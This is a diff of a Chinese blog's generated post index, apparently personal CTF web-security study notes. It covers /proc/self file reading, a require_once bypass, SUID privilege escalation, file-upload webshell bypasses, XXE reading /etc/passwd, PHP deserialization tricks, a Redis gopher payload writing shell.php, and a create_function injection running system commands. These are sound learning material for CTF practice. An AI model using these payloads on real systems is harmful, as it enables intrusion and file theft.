+<li>fd<br>fd 是一个目录，里面包含这当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录里的文件获得指定进程打开的每个文件的路径以及文件内容<br>这个fd比较重要，因为在 linux 系统中，如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</li>
+<li>self<br>上面这些操作列出的都是目标环境指定进程的信息，但是我们在做题的时候往往需要的当前进程的信息，这时候就用到了 &#x2F;proc 目录中的 self 子目录。</li>
+</ul>
+<p>&#x2F;proc&#x2F;self 表示当前进程目录。前面说了通过 &#x2F;proc&#x2F;$pid&#x2F; 来获取指定进程的信息。如果某个进程想要获取当前进程的系统信息，就可以通过进程的pid来访问&#x2F;proc&#x2F;$pid&#x2F;目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了 &#x2F;proc&#x2F;self&#x2F; 目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于 &#x2F;proc&#x2F;本进程pid&#x2F; 。进程可以通过访问 &#x2F;proc&#x2F;self&#x2F; 目录来获取自己的系统信息，而不用每次都获取pid。</p>
+<p>有了self目录就方便多了，下面我们演示一下self的常见使用</p>
+<pre><code class="bash">ls -al /proc/self/cwd
+ls /proc/self/cwd
+ls -al /proc/self/exe
+cat /proc/self/environ
+cat /proc/self/fd/&#123;id&#125;
+</code></pre>
+<p>在真正做题的时候，我们是不能通过命令的方式执行通过cat命令读取cmdline的，因为如果是cat读取&#x2F;proc&#x2F;self&#x2F;cmdline的话，得到的是cat进程的信息，所以我们要通过题目的当前进程使用读取文件（如文件包含漏洞，或者SSTI使用file模块读取文件）的方式读取&#x2F;proc&#x2F;self&#x2F;cmdline。</p>
+<h3 id="require-once"><a href="#require-once" class="headerlink" title="require_once"></a>require_once</h3><p>在php中，require_once在调用时php会检查该文件是否已经被包含过，如果是则不会再次包含，那么我们可以尝试绕过这个机制吗？不写入webshell只读文件有办法吗？</p>
+<pre><code class="php">&lt;?php
+error_reporting(E_ALL);
+require_once(&#39;flag.php&#39;);
+highlight_file(__FILE__);
+if(isset($_GET[&#39;content&#39;])) &#123;
+    $content = $_GET[&#39;content&#39;];
+    require_once($content);
+&#125; //题目的代码来自WMCTF2020 make php great again 2.0 绕过require_once是预期解
+</code></pre>
+<p>&#x2F;proc&#x2F;self指向当前进程的&#x2F;proc&#x2F;pid&#x2F;，&#x2F;proc&#x2F;self&#x2F;root&#x2F;是指向&#x2F;的符号链接，想到这里就可以用伪协议配合多级符号链接的办法进行绕过</p>
+<pre><code class="bash">php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
+</code></pre>
+<p><a href="https://www.anquanke.com/post/id/213235">不懂先记着</a></p>
+<h3 id="php伪随机数"><a href="#php伪随机数" class="headerlink" title="php伪随机数"></a>php伪随机数</h3><p><code>/Users/dionysus/PHP/一些具体的题/伪随机数脚本前.py</code><br>得到target<br><code>cd /Users/dionysus/Downloads/php_mt_seed-4.0</code><br><code>time ./php_mt_seed target</code><br>得到种子<br><code>time ./php_mt_seed 762464408</code><br>然后<code>/Users/dionysus/PHP/一些具体的题/伪随机数脚本后.php</code></p>
+<h3 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h3><pre><code class="bash"># 搜索 SUID file 可执行文件
+find / -type f -perm /4000 2&gt;/dev/null
+# 利用 sed 命令查看 flag
+/bin/sed &#39;1p&#39; /flag
+</code></pre>
+<p>Nmap，Vim，find，Bash，More，Less，Nano，cp等</p>
+<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>尝试特殊解析漏洞：php3,php5,phtml ； 大小写绕过：PHP,pHP； 点绕过：php.； 空格绕过：php空格；::$$DATA绕过：shell.php::$$DATA；双后缀：shell.phphpp；单循环绕过：shell.php. .；假文件名绕过：shell.php&#x2F;.</p>
+<p>.htaccess绕过和.user.ini绕过</p>
+<pre><code class="php">.htaccess绕过：
+GIF89a
+&lt;FilesMatch “shell.jpg”&gt;
+SetHandler application/x-httpd-php
+&lt;/FilesMatch&gt;
+</code></pre>
+<pre><code class="php">GIF89a
+auto_prepend_file=shell.jpg
+注：用蚁剑或菜刀链接实路径的shell.jpg改为index.php
+</code></pre>
+<p>!!!记得修改MIME的值 eg:image&#x2F;jpeg</p>
 ]]></content>
       <categories>
         <category>网络安全</category>
       </categories>
       <tags>
         <tag>web</tag>
-        <tag>php</tag>
       </tags>
   </entry>
   <entry>
@@ -849,9 +1258,9 @@ if (isset($a))&#123;
 <pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;
 &lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;
 &lt;catalog&gt;
-        &lt;core id=&quot;test101&quot;&gt;
-             &lt;description&gt;&amp;xxe;&lt;/description&gt;
-          &lt;/core&gt;
+     &lt;core id=&quot;test101&quot;&gt;
+       &lt;description&gt;&amp;xxe;&lt;/description&gt;
+    &lt;/core&gt;
 &lt;/catalog&gt;
 </code></pre>
 <p>svg格式</p>
@@ -860,7 +1269,7 @@ if (isset($a))&#123;
 &lt;!ENTITY file SYSTEM &quot;要读取的文件路径&quot; &gt;
 ]&gt;
 &lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;
-          &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;
+    &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;
 &lt;/svg&gt;
 </code></pre>
 <p>数据外带</p>
@@ -892,6 +1301,130 @@ shell.dtd
 &lt;/core&gt;
 </code></pre>
 ]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTML</title>
+    <url>/2023/04/12/htmllearing/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>前端</category>
+      </categories>
+      <tags>
+        <tag>html</tag>
+        <tag>学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>javactf</title>
+    <url>/2023/05/20/javactf/</url>
+    <content><![CDATA[<p>cd &#x2F;Users&#x2F;dionysus&#x2F;Downloads&#x2F;jd-gui-osx-1.6.6&#x2F;JD-GUI.app&#x2F;Contents&#x2F;Resources&#x2F;Java<br>java -jar jd-gui-1.6.6-min.jar &#x2F;Users&#x2F;dionysus&#x2F;Downloads&#x2F;ezjava.jar</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php反序列化</title>
+    <url>/2023/05/21/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h3 id="魔术函数"><a href="#魔术函数" class="headerlink" title="魔术函数"></a>魔术函数</h3><p>1、__get、__set</p>
+<p>这两个方法是为在类和他们的父类中没有声明的属性而设计的</p>
+<p>__get( $property ) 当调用一个未定义的属性时访问此方法</p>
+<p>__set( $property, $value ) 给一个未定义的属性赋值时调用</p>
+<p>这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</p>
+<p>2、__isset、__unset</p>
+<p>__isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法</p>
+<p>__unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法</p>
+<p>与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</p>
+<p>3、__call</p>
+<p>__call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法</p>
+<p>4、__autoload</p>
+<p>__autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。</p>
+<p>注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。</p>
+<p>5、__construct、__destruct</p>
+<p>__construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称</p>
+<p>__destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法</p>
+<p>默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用.</p>
+<p>在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。</p>
+<p>6、__clone</p>
+<p>PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。</p>
+<p>7、__toString</p>
+<p>__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时。<br>(1)  echo($obj) &#x2F; print($obj) 打印时会触发<br>(2) 反序列化对象与字符串连接时<br>(3) 反序列化对象参与格式化字符串时<br>(4) 反序列化对象与字符串进行&#x3D;&#x3D;比较时（PHP进行&#x3D;&#x3D;比较的时候会转换参数类型）<br>(5) 反序列化对象参与格式化SQL语句，绑定参数时<br>(6) 反序列化对象在经过php字符串函数，如 strlen()、addslashes()时<br>(7) 在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用<br>(8) 反序列化的对象作为 class_exists() 的参数的时候<br>如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。</p>
+<p>在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）</p>
+<p>从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。</p>
+<p>8、__sleep、__wakeup</p>
+<p>__sleep 使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</p>
+<p>__wakeup 使用unserialize时触发，反序列化恢复对象之前调用该方法</p>
+<p>serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。</p>
+<p>使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。</p>
+<p>相反地，unserialize() 检查具有魔术名称 __wakeup 的函数的存在。如果存在，此函数可以重建对象可能具有的任何资源。使用__wakeup 的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。</p>
+<p>9、__set_state</p>
+<p>当调用var_export()时，这个静态 方法会被调用（自PHP 5.1.0起有效）。本方法的唯一参数是一个数组，其中包含按array(’property’ &#x3D;&gt; value, …)格式排列的类属性。</p>
+<p>10、__invoke</p>
+<p>当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用。PHP5.3.0以上版本有效</p>
+<p>11、__callStatic</p>
+<p>它的工作方式类似于 __call() 魔术方法，__callStatic() 是为了处理静态方法调用，PHP5.3.0以上版本有效，PHP 确实加强了对 __callStatic() 方法的定义；它必须是公共的，并且必须被声明为静态的。</p>
+<p>同样，__call() 魔术方法必须被定义为公共的，所有其他魔术方法都必须如此。</p>
+<p>序列化格式中的字母含义：</p>
+<pre><code class="bash">a - array                    b - boolean  
+d - double                   i - integer
+o - common object            r - reference
+s - string                   C - custom object
+O - class                  N - null
+R - pointer reference      U - unicode string
+</code></pre>
+<h3 id="POP链利用技巧"><a href="#POP链利用技巧" class="headerlink" title="POP链利用技巧"></a>POP链利用技巧</h3><h4 id="一些有用的POP链中出现的方法"><a href="#一些有用的POP链中出现的方法" class="headerlink" title="一些有用的POP链中出现的方法"></a>一些有用的POP链中出现的方法</h4><ul>
+<li>命令执行：exec()、passthru()、popen()、system()</li>
+<li>文件操作：file_put_contents()、file_get_contents()、unlink()</li>
+<li>代码执行：eval()、assert()、call_user_func()</li>
+</ul>
+<h4 id="反序列化十六进制绕过关键字"><a href="#反序列化十六进制绕过关键字" class="headerlink" title="反序列化十六进制绕过关键字"></a>反序列化十六进制绕过关键字</h4><p>PHP 为了更加方便进行反序列化 Payload 的 传输与显示(避免丢失某些控制字符等信息)，我们可以在序列化内容中用大写S表示字符串，此时这个字符串就支持将后面的字符串用16进制表示，使用如下形式即可绕过<br><code>s:4:&quot;user&quot;; -&gt; S:4:&quot;use\72&quot;;</code><br>在反序列化时，序列化中的十六进制会被转化成字母<br>当过滤了c2e38 ，即可用 \63\32\65\33\38 替代，S解析十六进制<br>username:y1ng\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0\0<em>\0\0</em>\0<br>password:”;S:11:”\00*\00password”;O:8:”Hacker_A”:1:{S:5:”\63\32\65\33\38”;O:8:”Hacker_B”:1:{S:5:”\63\32\65\33\38”;O:8:”Hacker_C”:1:{s:4:”name”;s:4:”test”;}}};s:1:”a”;s:0:”</p>
+<p>\00 会被替换为 %00<br>\65 会被替换为 e</p>
+<p>过滤了%00，可用S来代替序列化字符串的s来绕过，在S情况下\00 会被解析成%00</p>
+<p>序列化时类中私有变量和受保护变量，php7.1+ 对属性并不敏感，public 也可用于protected：<br>private反序列化后是%00(类名)%00(变量名)，protect是%00*%00(变量名)</p>
+<h4 id="深浅copy"><a href="#深浅copy" class="headerlink" title="深浅copy"></a>深浅copy</h4><p>在php中如果我们使用 &amp; 对变量A的值指向变量B，这个时候是属于浅拷贝，当变量B改变时，变量A也会跟着改变。在被反序列化的对象的某些变量被过滤了，但是其他变量可控的情况下，就可以利用浅拷贝来绕过过滤。<br><code>$A = &amp;$B;</code></p>
+<h4 id="利用PHP伪协议"><a href="#利用PHP伪协议" class="headerlink" title="利用PHP伪协议"></a>利用PHP伪协议</h4><p>配合PHP伪协议实现文件包含、命令执行等漏洞。如glob:&#x2F;&#x2F; 伪协议查找匹配的文件路径模式</p>
+<h4 id="原生类"><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h4><p>a&#x3D;SplFileObject&amp;b&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>moonlit</title>
+    <url>/2023/05/31/moonlit/</url>
+    <content><![CDATA[<blockquote>
+<p>归根到底，人们所爱的不是欲望对象，而是欲望本身。</p>
+</blockquote>
+<p>我可能一直是个这样的人，其实都不重要的，你也知道的，ta也知道的，捉摸不透的情感对你来说百害无一利。</p>
+<p>这个世界确实不如你意，但我也直说了，你只是没有活成你预期的样子，或者他们预期的样子。</p>
+<p>继续或者幻想里，还是和你的欲望对峙。</p>
+<p>你就在这里，无处可逃。</p>
+<p>这次，我赌你赢。</p>
+<p><img src="/../post_img/%E7%A9%B9%E5%A6%B9.JPG" alt="穹妹"></p>
+]]></content>
+      <categories>
+        <category>日常</category>
+      </categories>
+      <tags>
+        <tag>不是好事</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>prize_p1</title>
+    <url>/2023/05/26/prize-p1/</url>
+    <content><![CDATA[]]></content>
       <categories>
         <category>网络安全</category>
       </categories>
@@ -1115,166 +1648,6 @@ curl -X POST https://www.example.com
       </tags>
   </entry>
   <entry>
-    <title>gopher</title>
-    <url>/2023/05/21/gopher/</url>
-    <content><![CDATA[<p>利用 gopher 的方式有 FTP 爆破，REDIS，MYSQL，FAST CGI，XXE</p>
-<h3 id="一些常见服务"><a href="#一些常见服务" class="headerlink" title="一些常见服务"></a>一些常见服务</h3><p>Redis 6379</p>
-<p>FPM 9000</p>
-<p>Smtp 25</p>
-<p>Mysql 3306<br>常见的协议：dict，gopher</p>
-<p>redis格式：每一个 *number 代表每一行命令，number 代表每行命令中数组中的元素个数。$number 代表每个元素的长度。</p>
-<pre><code>$8							//元素长度为8
-flushall
-*3							//3个元素
-$3
-set
-$1
-1
-$31
-
-&lt;?php echo &quot;hello world&quot; ?&gt;
-
-*4
-$6
-config
-$3
-set
-$3
-dir
-$13
-/var/www/html
-*4
-$6
-config
-$3
-set
-$10
-dbfilename
-$9
-shell.php
-*1
-$4
-save
-</code></pre>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>interesting</title>
-    <url>/2023/05/30/interesting/</url>
-    <content><![CDATA[<h2 id="Something-interesting"><a href="#Something-interesting" class="headerlink" title="Something interesting"></a>Something interesting</h2><h3 id="神奇的Unicode编码"><a href="#神奇的Unicode编码" class="headerlink" title="神奇的Unicode编码"></a>神奇的Unicode编码</h3><p><img src="/../post_img/fununicode.png" alt="都是假的"></p>
-<pre><code class="php">&lt;?php
-error_reporting(0);
-include &quot;flag.php&quot;;
-// ‮⁦NISACTF⁩⁦Welcome to
-if (&quot;jitanglailo&quot; == $_GET[ahahahaha] &amp;‮⁦+!!⁩⁦&amp; &quot;‮⁦ Flag!⁩⁦N1SACTF&quot; == $_GET[‮⁦Ugeiwo⁩⁦cuishiyuan]) &#123; //tnnd! weishenme b
-    echo $FLAG;
-&#125;
-show_source(__FILE__);
-?&gt;
-</code></pre>
-<p>我们cv下来，貌似没有变化，cv到文件，用010打开看看二进制。</p>
-<p><img src="/../post_img/fununicode1.png" alt="这是真的"></p>
-<p>真奇妙对吧。 什么原理呢</p>
-<p>其实粘贴后可以看到，代码中出现了<code>U+202E</code>,<code>U+2066</code>,<code>U+2069</code>,那这些东西是什么呢。</p>
-<p>直接解释：<code>U+202E</code>是从右往左强制符；<code>U+2066</code>是这之间的字符从左到右显示，不影响外围字符；<code>U+2069</code>是作为RLI、LRI、FSi翻转结束的标识。</p>
-<p>参考文章：<a href="https://www.xiinnn.com/article/22d50835.html">here</a><br>题目：[NISACTF 2022]checkin</p>
-<h3 id="md5硬碰撞和sha1硬碰撞"><a href="#md5硬碰撞和sha1硬碰撞" class="headerlink" title="md5硬碰撞和sha1硬碰撞"></a>md5硬碰撞和sha1硬碰撞</h3><p>md5:</p>
-<pre><code class="bash"> payload:array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;
-</code></pre>
-<pre><code class="bash">array2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
-</code></pre>
-<p>sha1:</p>
-<pre><code class="bash"> array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1
-</code></pre>
-<pre><code class="bash"> array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
-</code></pre>
-<h3 id="下划线绕过"><a href="#下划线绕过" class="headerlink" title="下划线绕过"></a>下划线绕过</h3><p>php的变量解析绕过, php会把请求参数中的非法字符转为下划线<br><code>+</code></p>
-<h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h3><p>create_function 是 PHP 的一个内置函数，但是在 PHP 7.2.0 以后，这个函数已经被废弃，官方文档中推荐使用匿名函数作为替代。</p>
-<pre><code class="php">eg:
-&lt;?php
-$newfunc = create_function(&#39;$x&#39;, &#39;return $x * $x;&#39;);
-echo &quot;Square of 3 is &quot; . $newfunc(3);
-?&gt;
-</code></pre>
-<p>在这个例子中，create_function 创建了一个新函数，这个函数接收一个参数 x 并且返回 x 的平方。然后我们用这个新函数来计算 3 的平方。</p>
-<p><strong>create_function 函数在 PHP 内部实际上是使用了 eval() 函数来创建新的函数。</strong></p>
-<pre><code class="bash">&lt;?php
-//sorry , here is true last level
-//^_^
-error_reporting(0);
-include &quot;str.php&quot;;
-
-$a = $_GET[&#39;a&#39;];
-$b = $_GET[&#39;b&#39;];
-if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;,$a))&#123;
-    show_source(__FILE__);
-&#125;
-else&#123;
-    $a(&#39;&#39;,$b);
-&#125;
-
-?a=\create_function&amp;b=&#125;system(&#39;tac /flag&#39;);//
-</code></pre>
-<p><code>\</code>绕过正则（其他符号试过貌似都不行） <code>&#125;</code>是结束前一个函数体  <code>\\</code>是注释后面的内容<br>总的来说利用<code>create_function</code>来执行<code>tac /flag</code></p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>javactf</title>
-    <url>/2023/05/20/javactf/</url>
-    <content><![CDATA[<p>cd &#x2F;Users&#x2F;dionysus&#x2F;Downloads&#x2F;jd-gui-osx-1.6.6&#x2F;JD-GUI.app&#x2F;Contents&#x2F;Resources&#x2F;Java<br>java -jar jd-gui-1.6.6-min.jar &#x2F;Users&#x2F;dionysus&#x2F;Downloads&#x2F;ezjava.jar</p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>moonlit</title>
-    <url>/2023/05/31/moonlit/</url>
-    <content><![CDATA[<blockquote>
-<p>归根到底，人们所爱的不是欲望对象，而是欲望本身。</p>
-</blockquote>
-<p>我可能一直是个这样的人，其实都不重要的，你也知道的，ta也知道的，捉摸不透的情感对你来说百害无一利。</p>
-<p>这个世界确实不如你意，但我也直说了，你只是没有活成你预期的样子，或者他们预期的样子。</p>
-<p>继续或者幻想里，还是和你的欲望对峙。</p>
-<p>你就在这里，无处可逃。</p>
-<p>这次，我赌你赢。</p>
-<p><img src="/../post_img/%E7%A9%B9%E5%A6%B9.JPG" alt="穹妹"></p>
-]]></content>
-      <categories>
-        <category>日常</category>
-      </categories>
-      <tags>
-        <tag>不是好事</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTML</title>
-    <url>/2023/04/12/htmllearing/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>前端</category>
-      </categories>
-      <tags>
-        <tag>html</tag>
-        <tag>学习</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>pin</title>
     <url>/2023/05/13/pin/</url>
     <content><![CDATA[<pre><code class="python">import hashlib
@@ -1335,78 +1708,10 @@ print(rv)
       </tags>
   </entry>
   <entry>
-    <title>php反序列化</title>
-    <url>/2023/05/21/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
-    <content><![CDATA[<h3 id="魔术函数："><a href="#魔术函数：" class="headerlink" title="魔术函数："></a>魔术函数：</h3><p>1、__get、__set</p>
-<p>这两个方法是为在类和他们的父类中没有声明的属性而设计的</p>
-<p>__get( $property ) 当调用一个未定义的属性时访问此方法</p>
-<p>__set( $property, $value ) 给一个未定义的属性赋值时调用</p>
-<p>这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</p>
-<p>2、__isset、__unset</p>
-<p>__isset( $property ) 当在一个未定义的属性上调用isset()函数时调用此方法</p>
-<p>__unset( $property ) 当在一个未定义的属性上调用unset()函数时调用此方法</p>
-<p>与__get方法和__set方法相同，这里的没有声明包括访问控制为proteced,private的属性（即没有权限访问的属性）</p>
-<p>3、__call</p>
-<p>__call( $method, $arg_array ) 当调用一个未定义(包括没有权限访问)的方法是调用此方法</p>
-<p>4、__autoload</p>
-<p>__autoload 函数，使用尚未被定义的类时自动调用。通过此函数，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。</p>
-<p>注意: 在 __autoload 函数中抛出的异常不能被 catch 语句块捕获并导致致命错误。</p>
-<p>5、__construct、__destruct</p>
-<p>__construct 构造方法，当一个对象被创建时调用此方法，好处是可以使构造方法有一个独一无二的名称，无论它所在的类的名称是什么，这样你在改变类的名称时，就不需要改变构造方法的名称</p>
-<p>__destruct 析构方法，PHP将在对象被销毁前（即从内存中清除前）调用这个方法</p>
-<p>默认情况下,PHP仅仅释放对象属性所占用的内存并销毁对象相关的资源.，析构函数允许你在使用一个对象之后执行任意代码来清除内存，当PHP决定你的脚本不再与对象相关时，析构函数将被调用.</p>
-<p>在一个函数的命名空间内，这会发生在函数return的时候，对于全局变量，这发生于脚本结束的时候，如果你想明确地销毁一个对象，你可以给指向该对象的变量分配任何其它值，通常将变量赋值勤为NULL或者调用unset。</p>
-<p>6、__clone</p>
-<p>PHP5中的对象赋值是使用的引用赋值，使用clone方法复制一个对象时，对象会自动调用__clone魔术方法，如果在对象复制需要执行某些初始化操作，可以在__clone方法实现。</p>
-<p>7、__toString</p>
-<p>__toString方法在将一个对象转化成字符串时自动调用，比如使用echo打印对象时。<br>(1)  echo($obj) &#x2F; print($obj) 打印时会触发<br>(2) 反序列化对象与字符串连接时<br>(3) 反序列化对象参与格式化字符串时<br>(4) 反序列化对象与字符串进行&#x3D;&#x3D;比较时（PHP进行&#x3D;&#x3D;比较的时候会转换参数类型）<br>(5) 反序列化对象参与格式化SQL语句，绑定参数时<br>(6) 反序列化对象在经过php字符串函数，如 strlen()、addslashes()时<br>(7) 在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用<br>(8) 反序列化的对象作为 class_exists() 的参数的时候<br>如果类没有实现此方法，则无法通过echo打印对象，否则会显示：Catchable fatal error: Object of class test could not be converted to string in，此方法必须返回一个字符串。</p>
-<p>在PHP 5.2.0之前，__toString方法只有结合使用echo() 或 print()时 才能生效。PHP 5.2.0之后，则可以在任何字符串环境生效（例如通过printf()，使用%s修饰符），但 不能用于非字符串环境（如使用%d修饰符）</p>
-<p>从PHP 5.2.0，如果将一个未定义__toString方法的对象 转换为字符串，会报出一个E_RECOVERABLE_ERROR错误。</p>
-<p>8、__sleep、__wakeup</p>
-<p>__sleep 使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</p>
-<p>__wakeup 使用unserialize时触发，反序列化恢复对象之前调用该方法</p>
-<p>serialize() 检查类中是否有魔术名称 __sleep 的函数。如果这样，该函数将在任何序列化之前运行。它可以清除对象并应该返回一个包含有该对象中应被序列化的所有变量名的数组。</p>
-<p>使用 __sleep 的目的是关闭对象可能具有的任何数据库连接，提交等待中的数据或进行类似的清除任务。此外，如果有非常大的对象而并不需要完全储存下来时此函数也很有用。</p>
